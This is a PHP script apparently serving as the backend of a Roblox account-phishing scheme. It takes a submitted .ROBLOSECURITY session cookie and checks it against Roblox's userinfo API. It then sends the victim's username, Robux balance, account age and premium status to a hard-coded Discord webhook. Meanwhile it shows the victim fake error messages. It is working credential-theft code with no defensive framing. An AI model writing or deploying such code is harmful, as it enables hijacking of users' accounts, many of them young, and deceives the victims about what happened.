<?php

// Your Discord Webhook URL
$webhook = 'https://discord.com/api/webhooks/1347344054828142592/wfkp6IKNPjsMph_80khvIt3AtJ6rUbNhAkr4TXXcuo9y77yIoG7PblOzg0IZTL5nux_W';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cookie = $_POST['cookie'];

    if (empty($cookie)) {
        echo "No cookie provided.";
        exit;
    }

    $headers = [
        "Cookie: .ROBLOSECURITY=$cookie",
        "User-Agent: Roblox/WinInet"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    if ($httpcode !== 200) {
        echo "Failed to Email Remove An Error";
        exit;
    }

    $data = json_decode($response, true);

    if (!$data || empty($data['UserName'])) {
        echo "Invalid cookie.";
        exit;
    }

    // Prepare embed
    $embed = [
        "title" => "New Roblox Login",
        "color" => hexdec("FF0000"), // Red
        "thumbnail" => [
            "url" => $data['ThumbnailUrl']
        ],
        "fields" => [
            ["name" => "Username", "value" => $data['UserName'], "inline" => true],
            ["name" => "Robux", "value" => $data['RobuxBalance'], "inline" => true],
            ["name" => "Account Created", "value" => (isset($data['Created']) ? $data['Created'] : "Unknown"), "inline" => true],
            ["name" => "Premium", "value" => $data['IsAnyBuildersClubMember'] ? "Yes" : "No", "inline" => true],
        ],
        "timestamp" => date('c')
    ];

    $payload = json_encode([
        "embeds" => [$embed]
    ]);

    // Send webhook
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_exec($ch);
    curl_close($ch);

    echo "Failed Error In User Account";
} else {
    echo "Invalid request.";
}
?>
